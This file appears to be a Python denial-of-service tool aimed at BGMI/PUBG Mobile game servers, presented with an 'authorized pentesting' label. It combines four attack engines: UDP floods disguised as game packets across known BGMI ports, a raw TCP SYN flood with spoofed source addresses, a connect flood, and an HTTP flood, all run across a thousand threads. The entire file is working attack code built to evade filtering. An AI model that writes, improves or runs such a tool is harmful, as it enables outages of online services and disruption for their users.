# final_bot.py — BGMI-STYLE GAME SERVER STRESS TEST (Authorized Only)
# Combines: UDP Flood + TCP SYN + Game Protocol Mimic + Port Rotation

import socket
import threading
import time
import random
import struct
import hashlib
import sys
import os

# ═══════════════════════════════════════════════
# 🎯 CONFIGURATION — SIRF APNE AUTHORIZED TARGET
# ═══════════════════════════════════════════════

TARGET_IP = "127.0.0.1"  # ← APNA AUTHORIZED IP YAHI DALO
TARGET_PORT = 10010       # ← APNA AUTHORIZED PORT
ATTACK_TIME = 120         # seconds
THREAD_COUNT = 1000       # Higher = more load
USE_ALL_PORTS = True      # BGMI ke saare ports rotate karega

# BGMI ke known ports (PUBG Mobile/BGMI protocol range)
BGMI_PORTS = [
    10010, 10013, 10039, 10096, 10491, 10612, 11455, 12235, 
    13748, 13894, 13972, 17000, 17500, 20000, 20001, 20002,
    8011, 9030, 8001, 9000, 9992, 30190, 41182, 41192
]

# ═══════════════════════════════════════════════
# 🧬 ENGINE 1: SMART UDP FLOOD (Game Protocol Mimic)
# ═══════════════════════════════════════════════

class UDPGameFlood:
    """Advanced UDP flood with BGMI-like packet structures"""
    
    @staticmethod
    def generate_game_packet(port):
        """Generate packets that look like real game traffic"""
        packet_type = random.randint(0, 5)
        
        # BGMI protocol header simulation
        session_id = random.getrandbits(64)
        sequence_num = random.randint(0, 65535)
        timestamp = int(time.time() * 1000) % 4294967296
        
        if packet_type == 0:
            # Pure flood — max size
            return random._urandom(1400)
            
        elif packet_type == 1:
            # Game position update packet
            header = struct.pack('!II', 0x47414D45, session_id & 0xFFFFFFFF)
            data = struct.pack('!fff', random.uniform(0, 8000), random.uniform(0, 8000), random.uniform(0, 500))
            return header + data + random._urandom(1380 - len(data))
            
        elif packet_type == 2:
            # Matchmaking packet
            header = struct.pack('!II', 0x4D415443, session_id & 0xFFFFFFFF)
            player_data = struct.pack('!III', random.randint(1, 100), random.randint(1, 4), sequence_num)
            return header + player_data + random._urandom(1380 - len(player_data))
            
        elif packet_type == 3:
            # Voice/data channel mimic
            header = struct.pack('!II', 0x564F4943, timestamp)
            return header + random._urandom(1392)
            
        elif packet_type == 4:
            # Keepalive with game-specific flags
            flags = random.randint(0, 255)
            header = struct.pack('!IB', 0x4B454550, flags)
            return header + random._urandom(1395)
            
        else:
            # Encrypted payload simulation
            key = hashlib.md5(struct.pack('!I', port)).digest()
            payload = random._urandom(1390)
            encrypted = bytes([p ^ key[i % len(key)] for i, p in enumerate(payload)])
            return struct.pack('!I', 0x454E4352) + encrypted

    @staticmethod
    def flood(target_ip, port_stop, stop_event):
        """Single thread UDP flood worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Optimize for speed
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        except:
            pass
        
        ports = BGMI_PORTS if USE_ALL_PORTS else [port_stop]
        
        while not stop_event.is_set():
            try:
                port = random.choice(ports)
                data = UDPGameFlood.generate_game_packet(port)
                sock.sendto(data, (target_ip, port))
                
                # Rapid fire — no delay
                for _ in range(random.randint(0, 5)):
                    sock.sendto(data, (target_ip, random.choice(ports)))
            except:
                pass
        
        sock.close()


# ═══════════════════════════════════════════════
# 🧬 ENGINE 2: TCP SYN FLOOD (Raw Socket)
# ═══════════════════════════════════════════════

class TCPSYNFlood:
    """TCP SYN flood using raw sockets"""
    
    @staticmethod
    def create_syn_packet(source_ip, target_ip, target_port):
        """Create raw TCP SYN packet"""
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # IP header + TCP header
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
            ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP header
        tcp_source = random.randint(1024, 65535)
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4-bit field (5 = 20 bytes)
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, target_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = UDPGameFlood.calculate_checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBH', tcp_source, target_port, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return ip_header + tcp_header

    @staticmethod
    def flood(target_ip, target_port, stop_event):
        """SYN flood worker"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            # Fallback to normal connect flood if no raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while not stop_event.is_set():
                try:
                    sock.connect((target_ip, target_port))
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                except:
                    pass
            return
        
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while not stop_event.is_set():
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                packet = TCPSYNFlood.create_syn_packet(src_ip, target_ip, target_port)
                sock.sendto(packet, (target_ip, target_port))
            except:
                pass
        
        sock.close()


# ═══════════════════════════════════════════════
# 🧬 ENGINE 3: FAST CONNECT FLOOD
# ═══════════════════════════════════════════════

class ConnectFlood:
    """TCP connect flood — creates real connections"""
    
    @staticmethod
    def flood(target_ip, target_port, stop_event):
        ports = BGMI_PORTS if USE_ALL_PORTS else [target_port]
        
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip, random.choice(ports)))
                # Send garbage data
                try:
                    s.send(random._urandom(random.randint(100, 1400)))
                except:
                    pass
                s.close()
            except:
                pass


# ═══════════════════════════════════════════════
# 🧬 ENGINE 4: HTTP/HTTPS LAYER 7 FLOOD
# ═══════════════════════════════════════════════

class HTTPFlood:
    """Layer 7 HTTP flood for web-facing game services"""
    
    @staticmethod
    def flood(target_ip, target_port, stop_event):
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port if target_port else 80))
                
                # Random user agent + request
                user_agents = [
                    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
                    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B)",
                    "BGMI/2.5.0 (iPhone14,3; iOS 16.0)"
                ]
                
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()
                
                s.send(request)
                s.close()
            except:
                pass


# ═══════════════════════════════════════════════
# 🎮 MAIN CONTROLLER
# ═══════════════════════════════════════════════

class GameStressTester:
    """Main controller for game server stress testing"""
    
    @staticmethod
    def calculate_checksum(data):
        """Calculate IP/TCP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s = (s >> 16) + (s & 0xffff)
        
        return ~s & 0xffff
    
    @staticmethod
    def print_banner():
        print("""
╔══════════════════════════════════════════════════════╗
║     🎯 GAME SERVER STRESS TEST ENGINE v3.0          ║
║     ⚡ FOR AUTHORIZED PENTESTING ONLY ⚡             ║
╚══════════════════════════════════════════════════════╝
        """)
    
    @staticmethod
    def start_test():
        GameStressTester.print_banner()
        
        print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
        print(f"[*] Duration: {ATTACK_TIME}s")
        print(f"[*] Threads: {THREAD_COUNT}")
        print(f"[*] Port rotation: {'ON' if USE_ALL_PORTS else 'OFF'} ({len(BGMI_PORTS)} ports)")
        print(f"\n[!] Starting layered attack...\n")
        
        stop_event = threading.Event()
        threads = []
        
        # Engine 1: UDP Game Flood (50% threads)
        udp_threads = int(THREAD_COUNT * 0.5)
        print(f"[+] UDP Game Flood: {udp_threads} threads")
        for i in range(udp_threads):
            t = threading.Thread(
                target=UDPGameFlood.flood,
                args=(TARGET_IP, TARGET_PORT, stop_event),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        # Engine 2: TCP SYN Flood (20% threads)
        syn_threads = int(THREAD_COUNT * 0.2)
        print(f"[+] TCP SYN Flood: {syn_threads} threads")
        for i in range(syn_threads):
            t = threading.Thread(
                target=TCPSYNFlood.flood,
                args=(TARGET_IP, TARGET_PORT, stop_event),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        # Engine 3: Connect Flood (20% threads)
        con_threads = int(THREAD_COUNT * 0.2)
        print(f"[+] TCP Connect Flood: {con_threads} threads")
        for i in range(con_threads):
            t = threading.Thread(
                target=ConnectFlood.flood,
                args=(TARGET_IP, TARGET_PORT, stop_event),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        # Engine 4: HTTP Flood (10% threads if web)
        http_threads = int(THREAD_COUNT * 0.1)
        print(f"[+] HTTP Flood: {http_threads} threads")
        for i in range(http_threads):
            t = threading.Thread(
                target=HTTPFlood.flood,
                args=(TARGET_IP, TARGET_PORT, stop_event),
                daemon=True
            )
            threads.append(t)
            t.start()
        
        print(f"\n[✓] Total threads deployed: {len(threads)}")
        print(f"[*] Attack running for {ATTACK_TIME} seconds...\n")
        
        # Live counter
        start_time = time.time()
        try:
            while time.time() - start_time < ATTACK_TIME:
                remaining = int(ATTACK_TIME - (time.time() - start_time))
                sys.stdout.write(f"\r[⏱] Time remaining: {remaining}s | Threads active: {threading.active_count()}")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        
        # Stop
        stop_event.set()
        print(f"\n\n[✓] Attack completed after {ATTACK_TIME} seconds")
        print(f"[✓] Threads used: {len(threads)}")
        print(f"[✓] Target: {TARGET_IP}:{TARGET_PORT}")
        
        # Stats
        total_packets = udp_threads * ATTACK_TIME * 1000  # approximate
        print(f"[📊] Estimated packets sent: {total_packets:,}")


# ═══════════════════════════════════════════════
# 🚀 ENTRY POINT
# ═══════════════════════════════════════════════

if __name__ == "__main__":
    try:
        # Add checksum function to UDPGameFlood
        UDPGameFlood.calculate_checksum = GameStressTester.calculate_checksum
        
        GameStressTester.start_test()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")
